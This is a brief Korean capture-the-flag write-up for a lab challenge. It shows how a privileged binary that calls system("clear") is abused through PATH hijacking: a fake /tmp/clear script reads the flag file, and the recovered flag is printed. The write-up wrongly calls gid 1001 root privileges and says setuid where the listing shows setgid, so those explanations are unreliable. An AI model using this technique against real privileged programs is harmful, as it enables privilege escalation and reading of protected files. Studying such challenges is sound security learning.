
# 문제 메인 코드
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setresgid(0x3E9u, 0x3E9u, 0x3E9u);
  system("clear");
  puts("Tada~!");
  return 0;
}
```


# 분석
화면을 초기화 해주는 clear명령어를 실행시키고 종료함
한편 해당 바이너리는 root의 권한(0x3E9u=1001)으로 실행되고 있고,
바이너리를 실행하는 환경을 보면 `chal` 바이너리에 `setuid`가 걸려있음을 알 수 있음
```sh
pwn@localhost:~$ ls -l
total 20
-rwxr-sr-x 1 root pwned 16048 Dec 12  2022 chal
-rw-r-S--- 1 root pwned    69 Dec 12  2022 flag
```
*s는 실행 권한이 있고 S는 없음*

일반적으로 사용자는 자신의 쉘 환경에 대해 환경변수를 설정할 수 있는데, 권한이 비교적 자유로운 /tmp를 이용하여, 기존의 clear 명령어 바이너리보다 먼저 우선순위를 가진 바이너리를 만들 수 있음
```sh
export PATH=/my/custom/path:$PATH
export PATH=/tmp:$PATH
```

# exploit
```sh
echo '/bin/cat ./flag' > /tmp/clear
chmod +x /tmp/clear
export PATH=/tmp:$PATH
./chal 
DH{e47d874ddc629f916d3d5ef6f0d0de90c7b151f9d7010325d051c811382b489f}
Tada~!
```